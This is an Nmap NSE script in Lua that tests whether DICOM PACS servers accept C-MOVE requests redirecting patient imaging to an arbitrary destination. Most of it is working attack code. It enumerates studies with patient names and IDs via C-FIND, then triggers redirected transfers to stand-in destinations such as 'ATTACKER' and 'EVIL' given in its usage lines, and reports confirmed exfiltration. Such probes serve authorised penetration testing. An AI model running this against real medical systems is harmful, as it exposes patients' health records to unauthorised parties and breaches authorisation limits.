description = [[
DICOM C-MOVE redirection probe and data exfiltration proof-of-concept.

Tests whether a DICOM PACS/server will honour C-MOVE requests that redirect
patient data to an arbitrary destination AE Title. C-MOVE is an SSRF-like
primitive: the attacker tells the SCP to push images to a third-party host
(or back to the attacker) without needing the target to be in the modality
worklist. This is the most dangerous Q/R primitive because:

  1. The attacker never receives data on the same association (unlike C-GET);
     instead, the SCP opens a NEW association to the destination and sends
     C-STORE sub-operations.
  2. If the destination AE is configured in the PACS, the move succeeds
     silently - the attacker can exfiltrate data to any registered node.
  3. Even if the destination is unknown, the SCP may still attempt a TCP
     connection to resolve it (observable as an outbound connection attempt).

The workflow:
  1. (Optional) C-FIND at STUDY level to discover studies
  2. C-MOVE-RQ with a configurable MoveDestination AE Title
  3. Monitor C-MOVE-RSP status (PENDING progress, SUCCESS, or FAILURE)
  4. Report whether the PACS accepted the move, how many sub-operations
     completed/failed/warned, and any error status codes

This script does NOT set up a listener to receive the redirected images.
Use dicom-get.nse if you want to actually download data. This script's
purpose is to prove that arbitrary-destination C-MOVE is accepted.

WARNING: This is an intrusive script. A successful C-MOVE causes the target
PACS to attempt to push patient data to the specified destination. Only use
against systems for which you have explicit written authorisation.

Requires the dicom.lua library (place in nselib/ or same directory).
]]

---
-- @usage
-- nmap -p 4242 --script dicom-cmove \
--   --script-args 'dicom-cmove.called_ae=ORTHANC,dicom-cmove.dest_ae=ATTACKER' <target>
--
-- @usage
-- # Move a specific study to a destination AE
-- nmap -p 4242 --script dicom-cmove \
--   --script-args 'dicom-cmove.called_ae=ORTHANC,dicom-cmove.study_uid=1.2.3.4.5,dicom-cmove.dest_ae=EVIL' <target>
--
-- @usage
-- # Probe with patient root model and custom timeout
-- nmap -p 4242 --script dicom-cmove \
--   --script-args 'dicom-cmove.called_ae=ORTHANC,dicom-cmove.dest_ae=EXFIL,dicom-cmove.info_model=patient,dicom-cmove.timeout=15' <target>
--
-- @args dicom-cmove.called_ae    Target AE Title (default: "ANY-SCP")
-- @args dicom-cmove.calling_ae   Our AE Title (default: "NMAP-MOVE")
-- @args dicom-cmove.dest_ae      MoveDestination AE Title - where to redirect
-- data (default: "YOURPACS")
-- @args dicom-cmove.study_uid    Specific StudyInstanceUID to move (default:
-- discover via C-FIND)
-- @args dicom-cmove.series_uid   Specific SeriesInstanceUID to move (requires
-- study_uid)
-- @args dicom-cmove.patient_name Patient name filter for C-FIND discovery
-- (default: "*")
-- @args dicom-cmove.patient_id   Patient ID filter for C-FIND discovery
-- (default: "")
-- @args dicom-cmove.modality     Modality filter for C-FIND discovery
-- (default: "")
-- @args dicom-cmove.level        Move level: "STUDY", "SERIES", "IMAGE"
-- (default: "STUDY")
-- @args dicom-cmove.max_studies  Max studies to attempt C-MOVE on (default: 1)
-- @args dicom-cmove.timeout      DIMSE timeout in seconds (default: 15)
-- @args dicom-cmove.max_pdu      Max PDU Length (default: 16384)
-- @args dicom-cmove.info_model   Q/R information model: "study" or "patient"
-- (default: "study")
--
-- @output
-- PORT     STATE SERVICE
-- 4242/tcp open  dicom
-- | dicom-cmove:
-- |   Target AE: ORTHANC  Calling AE: NMAP-MOVE
-- |   MoveDestination: ATTACKER
-- |   Studies discovered: 2 (via C-FIND)
-- |   C-MOVE Results:
-- |     Study 1.2.826...514 - Doe^John (PT_001)
-- |       Status: REFUSED (0xA801) - Move destination unknown
-- |       Completed: 0  Failed: 0  Warning: 0
-- |     Study 1.2.826...515 - Smith^Jane (PT_002)
-- |       Status: SUCCESS (0x0000)
-- |       Completed: 45  Failed: 0  Warning: 0
-- |       WARNING: PACS pushed 45 instances to 'ATTACKER'
-- |   Summary: 1/2 studies accepted C-MOVE redirection
-- |   VULNERABILITY: Server redirects patient data to arbitrary AE titles
-- |_
---

author   = "Paulino Calderon <paulino@calderonpale.com>"
license  = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive"}

local shortport = require "shortport"
local stdnse    = require "stdnse"
local nmap      = require "nmap"
local string    = require "string"
local math      = require "math"
local dicom     = require "dicom"

portrule = shortport.port_or_service({104, 2762, 11112, 4242}, "dicom", "tcp",
    "open")

-----------------------------------------------------------------------
-- HELPERS
-----------------------------------------------------------------------

local function get_arg(key, default)
  return stdnse.get_script_args("dicom-cmove." .. key) or default
end

--- Translate a C-MOVE-RSP status code to a human-readable string.
-- References: PS3.4 Table C.4-2 (Move Service Status Values)
local function move_status_str(code)
  if code == 0x0000 then return "SUCCESS"
  elseif code == 0xFF00 then return "PENDING"
  elseif code == 0xFF01 then return "PENDING (warnings)"
  elseif code == 0xFE00 then return "CANCEL"
  -- Failure statuses
  elseif code == 0xA701 then
    return "REFUSED - out of resources, unable to calculate number of matches"
  elseif code == 0xA702 then
    return "REFUSED - out of resources, unable to perform sub-operations"
  elseif code == 0xA801 then return "REFUSED - move destination unknown"
  elseif code == 0xA900 then
    return "REFUSED - identifier does not match SOP Class"
  elseif code == 0xC000 then return "FAILED - unable to process"
  -- Warning statuses
  elseif code == 0xB000 then
    return "WARNING - sub-operations complete with failures"
  -- Range-based statuses
  elseif code >= 0xC000 and code <= 0xCFFF then
    return string.format("FAILED - unable to process (0x%04X)", code)
  elseif code >= 0xA000 and code <= 0xAFFF then
    return string.format("REFUSED (0x%04X)", code)
  else
    return string.format("UNKNOWN (0x%04X)", code)
  end
end

--- Classify a final status as accepted, refused, or error.
local function classify_status(code)
  if code == 0x0000 then return "accepted"       -- SUCCESS
  elseif code == 0xB000 then return "accepted"    -- WARNING (partial success)
  elseif code >= 0xA000 and code <= 0xAFFF then return "refused"
  elseif code >= 0xC000 and code <= 0xCFFF then return "failed"
  elseif code == 0xFE00 then return "cancelled"
  else return "unknown"
  end
end

-----------------------------------------------------------------------
-- C-FIND DISCOVERY (reused from dicom-get pattern)
-----------------------------------------------------------------------

--- Discover studies via C-FIND.
-- @return list of {study_uid, patient_name, patient_id, modality, description}
local function discover_studies(host, port, called_ae, calling_ae, find_sop,
                                 pat_name, pat_id, modality, max_pdu,
                                 timeout_s, max_studies)
  local ok, sock, pctxs, server_max_pdu = dicom.do_associate(
    host, port, called_ae, calling_ae, {find_sop}, max_pdu, timeout_s)
  if not ok then return nil, sock end

  local pctx_id = dicom.pick_accepted_pctx(pctxs)
  if not pctx_id then
    dicom.do_release(sock, 3)
    return nil, "No accepted presentation context for C-FIND"
  end

  local ts = dicom.get_accepted_ts(pctxs, pctx_id)
      or dicom.TRANSFER_SYNTAX.EXPLICIT_LE
  local eff_max = math.min(server_max_pdu or max_pdu, max_pdu)

  -- Build query
  local query_tags = {
    {group=0x0010, elem=0x0010, vr="PN", value=pat_name},   -- PatientName
    {group=0x0010, elem=0x0020, vr="LO", value=pat_id},     -- PatientID
    {group=0x0020, elem=0x000D, vr="UI", value=""},
        -- StudyInstanceUID (return key)
    {group=0x0008, elem=0x0061, vr="CS", value=modality}, -- ModalitiesInStudy
    {group=0x0008, elem=0x1030, vr="LO", value=""}, -- StudyDescription
  }

  local cmd = dicom.build_cfind_rq(1, find_sop)
  local ds  = dicom.build_cfind_dataset("STUDY", query_tags, ts)
  dicom.send_dimse(sock, pctx_id, cmd, ds, eff_max)

  -- Collect responses
  local studies = {}
  local carry = ""

  while true do
    local pdu_type, cmd_elems, resp_ds, raw
    pdu_type, cmd_elems, resp_ds, raw, carry = dicom.recv_dimse(sock,
        timeout_s, carry)

    if not pdu_type then break end
    if pdu_type == dicom.PDU_CODES.ABORT then break end
    if pdu_type ~= dicom.PDU_CODES.DATA then break end

    local status = 0xFFFF
    if cmd_elems and cmd_elems["0000,0900"] then
      status = cmd_elems["0000,0900"].value
    end

    if status == dicom.STATUS.PENDING
        or status == dicom.STATUS.PENDING_WARN then
      if #resp_ds > 0 then
        local elems = dicom.parse_dataset(resp_ds, ts)
        if elems then
          studies[#studies + 1] = {
            study_uid    = elems["0020,000D"] or "",
            patient_name = elems["0010,0010"] or "",
            patient_id   = elems["0010,0020"] or "",
            modality     = elems["0008,0061"] or "",
            description  = elems["0008,1030"] or "",
          }
          if #studies >= max_studies then
            stdnse.debug1("C-FIND: max_studies (%d) reached", max_studies)
            break
          end
        end
      end
    elseif status == dicom.STATUS.SUCCESS then
      break
    else
      break
    end
  end

  dicom.do_release(sock, 3)
  return studies
end

-----------------------------------------------------------------------
-- C-MOVE PROBE
-----------------------------------------------------------------------

--- Send C-MOVE-RQ for a study/series and monitor the response.
--
-- C-MOVE flow (PS3.4 C.4.2):
--   SCU sends C-MOVE-RQ with MoveDestination + identifier dataset
--   SCP opens NEW association to MoveDestination and sends C-STORE ops
--   SCP sends C-MOVE-RSP (PENDING) with progress counters
--   SCP sends C-MOVE-RSP (final) with SUCCESS/FAILURE/WARNING
--
-- We only monitor the C-MOVE-RSP messages on our association.
-- We do NOT receive the C-STORE sub-operations (those go to dest_ae).
--
-- @return result table with status info
local function do_cmove(host, port, called_ae, calling_ae, move_sop,
                        query_tags, level, dest_ae, max_pdu, timeout_s)
  local result = {
    status_code  = nil,
    status_str   = "",
    classification = "",
    completed    = 0,
    failed       = 0,
    warning      = 0,
    remaining    = 0,
    error_msg    = nil,
  }

  -- Only propose the C-MOVE SOP class (no storage classes needed --
  -- the SCP opens a separate association to the destination for C-STORE)
  local ok, sock, pctxs, server_max_pdu = dicom.do_associate(
    host, port, called_ae, calling_ae, {move_sop}, max_pdu, timeout_s)
  if not ok then
    result.error_msg = tostring(sock)
    return result
  end

  local pctx_id = dicom.pick_accepted_pctx(pctxs)
  if not pctx_id then
    dicom.do_release(sock, 3)
    result.error_msg = "No accepted presentation context for C-MOVE"
    return result
  end

  local ts = dicom.get_accepted_ts(pctxs, pctx_id)
      or dicom.TRANSFER_SYNTAX.EXPLICIT_LE
  local eff_max = math.min(server_max_pdu or max_pdu, max_pdu)

  -- Build C-MOVE-RQ command + identifier dataset
  local cmd_bytes = dicom.build_cmove_rq(1, move_sop, dest_ae)
  -- The identifier dataset is the same format as C-FIND/C-GET
  local ds_bytes  = dicom.build_cget_dataset(level, query_tags, ts)

  stdnse.debug1("C-MOVE: sending RQ to move to '%s' via %s level=%s",
    dest_ae, move_sop, level)
  dicom.send_dimse(sock, pctx_id, cmd_bytes, ds_bytes, eff_max)

  -- Monitor C-MOVE-RSP messages
  local carry = ""
  local got_final = false

  while true do
    local pdu_type, cmd_elems, resp_ds, raw
    pdu_type, cmd_elems, resp_ds, raw, carry =
      dicom.recv_dimse(sock, timeout_s, carry)

    if not pdu_type then
      if not got_final then
        result.error_msg = "Connection lost or timeout waiting for" ..
                           " C-MOVE-RSP: " ..
          tostring(raw)
      end
      break
    end

    if pdu_type == dicom.PDU_CODES.ABORT then
      result.error_msg = "Received A-ABORT during C-MOVE"
      result.status_str = "ABORTED"
      result.classification = "refused"
      break
    end

    if pdu_type ~= dicom.PDU_CODES.DATA then
      stdnse.debug1("C-MOVE: unexpected PDU 0x%02X", pdu_type)
      break
    end

    local cmd_field = 0
    if cmd_elems and cmd_elems["0000,0100"] then
      cmd_field = cmd_elems["0000,0100"].value
    end

    if cmd_field == dicom.COMMAND_FIELD.C_MOVE_RSP then
      local move_status = 0xFFFF
      if cmd_elems["0000,0900"] then
        move_status = cmd_elems["0000,0900"].value
      end

      -- Extract sub-operation counters (PS3.7 Table 9.1-5)
      if cmd_elems["0000,1020"] then
        result.remaining = cmd_elems["0000,1020"].value
      end
      if cmd_elems["0000,1021"] then
        result.completed = cmd_elems["0000,1021"].value
      end
      if cmd_elems["0000,1022"] then
        result.failed = cmd_elems["0000,1022"].value
      end
      if cmd_elems["0000,1023"] then
        result.warning = cmd_elems["0000,1023"].value
      end

      if move_status == dicom.STATUS.PENDING
          or move_status == dicom.STATUS.PENDING_WARN then
        stdnse.debug2("C-MOVE: progress - %d completed, %d remaining, %d" ..
                      " failed",
          result.completed, result.remaining, result.failed)
      else
        -- Final response
        result.status_code = move_status
        result.status_str = move_status_str(move_status)
        result.classification = classify_status(move_status)
        got_final = true

        -- Check for error comment
        if cmd_elems["0000,0902"] then
          result.error_msg = tostring(cmd_elems["0000,0902"].value):gsub("%z",
              ""):gsub("%s+$", "")
        end

        stdnse.debug1("C-MOVE: final status 0x%04X (%s) - %d completed, %d" ..
                      " failed, %d warning",
          move_status, result.status_str, result.completed, result.failed,
              result.warning)
        break
      end
    else
      stdnse.debug1("C-MOVE: unexpected command field 0x%04X", cmd_field)
    end
  end

  dicom.do_release(sock, 3)
  return result
end

-----------------------------------------------------------------------
-- MAIN ACTION
-----------------------------------------------------------------------

action = function(host, port)
  local called_ae      = get_arg("called_ae",      "ANY-SCP")
  local calling_ae     = get_arg("calling_ae",     "NMAP-MOVE")
  local dest_ae        = get_arg("dest_ae",        "YOURPACS")
  local study_uid      = get_arg("study_uid",       nil)
  local series_uid     = get_arg("series_uid",      nil)
  local pat_name       = get_arg("patient_name",   "*")
  local pat_id         = get_arg("patient_id",     "")
  local modality       = get_arg("modality",       "")
  local level          = get_arg("level",          "STUDY"):upper()
  local max_studies    = tonumber(get_arg("max_studies",    "1"))
  local timeout_s      = tonumber(get_arg("timeout",       "15"))
  local max_pdu        = tonumber(get_arg("max_pdu",       "16384"))
  local info_model     = get_arg("info_model",     "study"):lower()

  local out = stdnse.output_table()

  out["Target AE"]       = called_ae
  out["Calling AE"]      = calling_ae
  out["MoveDestination"] = dest_ae

  -- Select Q/R SOP classes
  local find_sop, move_sop
  if info_model == "patient" then
    find_sop = dicom.SOP_CLASS.PATIENT_ROOT_QR_FIND
    move_sop = dicom.SOP_CLASS.PATIENT_ROOT_QR_MOVE
  else
    find_sop = dicom.SOP_CLASS.STUDY_ROOT_QR_FIND
    move_sop = dicom.SOP_CLASS.STUDY_ROOT_QR_MOVE
  end

  -- == Phase 1: Discover studies (or use provided UID) ==
  local studies = {}

  if study_uid then
    studies[#studies + 1] = {
      study_uid    = study_uid,
      patient_name = "(specified)",
      patient_id   = "",
    }
    out["Studies"] = "1 (specified via study_uid)"
  else
    local found, err = discover_studies(host, port, called_ae, calling_ae,
      find_sop, pat_name, pat_id, modality, max_pdu, timeout_s, max_studies)

    if not found then
      out["Error"] = "C-FIND discovery failed: " .. tostring(err)
      return out
    end

    if #found == 0 then
      out["Result"] = "No studies found (server may require specific AE" ..
                      " title or filter)"
      return out
    end

    studies = found
    out["Studies discovered"] = string.format("%d (via C-FIND)", #studies)
  end

  -- == Phase 2: Send C-MOVE-RQ for each study ==
  local move_results = {}
  local total_accepted = 0
  local total_refused  = 0
  local total_failed   = 0
  local total_completed_subops = 0

  for _, study in ipairs(studies) do
    if study.study_uid == "" then goto next_study end

    -- Build identifier tags for C-MOVE
    local query_tags = {
      {group=0x0020, elem=0x000D, vr="UI", value=study.study_uid},
    }
    local move_level = level

    if series_uid and series_uid ~= "" then
      query_tags[#query_tags + 1] =
        {group=0x0020, elem=0x000E, vr="UI", value=series_uid}
      move_level = "SERIES"
    end

    stdnse.debug1("C-MOVE: requesting move of study %s (%s) -> '%s'",
      study.study_uid, study.patient_name, dest_ae)

    local r = do_cmove(host, port, called_ae, calling_ae, move_sop,
      query_tags, move_level, dest_ae, max_pdu, timeout_s)

    r.study_uid    = study.study_uid
    r.patient_name = study.patient_name
    r.patient_id   = study.patient_id
    move_results[#move_results + 1] = r

    if r.classification == "accepted" then
      total_accepted = total_accepted + 1
      total_completed_subops = total_completed_subops + r.completed
    elseif r.classification == "refused" then
      total_refused = total_refused + 1
    else
      total_failed = total_failed + 1
    end

    ::next_study::
  end

  -- == Output ==
  local result_lines = {}

  for _, r in ipairs(move_results) do
    local short_uid = r.study_uid
    if #short_uid > 40 then
      short_uid = short_uid:sub(1, 20) .. "..." .. short_uid:sub(-16)
    end

    local line = string.format("Study %s - %s", short_uid, r.patient_name)
    if r.patient_id ~= "" then
      line = line .. string.format(" (%s)", r.patient_id)
    end
    result_lines[#result_lines + 1] = line

    if r.error_msg and not r.status_code then
      -- Connection/association error, no C-MOVE-RSP received
      result_lines[#result_lines + 1] = string.format("  Error: %s",
          r.error_msg)
    elseif r.status_code then
      result_lines[#result_lines + 1] = string.format(
        "  Status: %s", r.status_str)
      result_lines[#result_lines + 1] = string.format(
        "  Completed: %d  Failed: %d  Warning: %d",
        r.completed, r.failed, r.warning)

      if r.error_msg then
        result_lines[#result_lines + 1] = string.format(
          "  Error comment: %s", r.error_msg)
      end

      if r.classification == "accepted" and r.completed > 0 then
        result_lines[#result_lines + 1] = string.format(
          "  WARNING: PACS pushed %d instances to '%s'",
          r.completed, dest_ae)
      end
    end
  end

  out["C-MOVE Results"] = result_lines

  -- Summary
  local total = #move_results
  if total > 0 then
    out["Summary"] = string.format(
      "%d/%d studies: %d accepted, %d refused, %d errored",
      total_accepted, total, total_accepted, total_refused, total_failed)
  end

  -- Vulnerability assessment
  if total_accepted > 0 then
    if total_completed_subops > 0 then
      out["VULNERABILITY"] = string.format(
        "Server redirected %d instances to arbitrary AE '%s' - " ..
        "data exfiltration via C-MOVE confirmed",
        total_completed_subops, dest_ae)
    else
      out["VULNERABILITY"] = string.format(
        "Server accepted C-MOVE to '%s' (0 sub-ops completed - " ..
        "destination may be unreachable but redirection was attempted)",
        dest_ae)
    end
  elseif total_refused > 0 and total_accepted == 0 then
    -- All refused - check if it's because destination is unknown
    local all_dest_unknown = true
    for _, r in ipairs(move_results) do
      if r.status_code ~= 0xA801 then
        all_dest_unknown = false
        break
      end
    end
    if all_dest_unknown then
      out["Note"] = string.format(
        "C-MOVE refused: destination '%s' is unknown to the PACS. " ..
        "The server validates MoveDestination against its modality list. " ..
        "Try a known AE title (e.g. the server's own AE) to confirm" ..
        " redirection.",
        dest_ae)
    else
      out["Note"] = "C-MOVE was refused by the server. See status codes above."
    end
  end

  nmap.set_port_state(host, port, "open")
  port.version.name = "dicom"
  port.version.product = "DICOM SCP"
  nmap.set_port_version(host, port, "hardmatched")

  return out
end
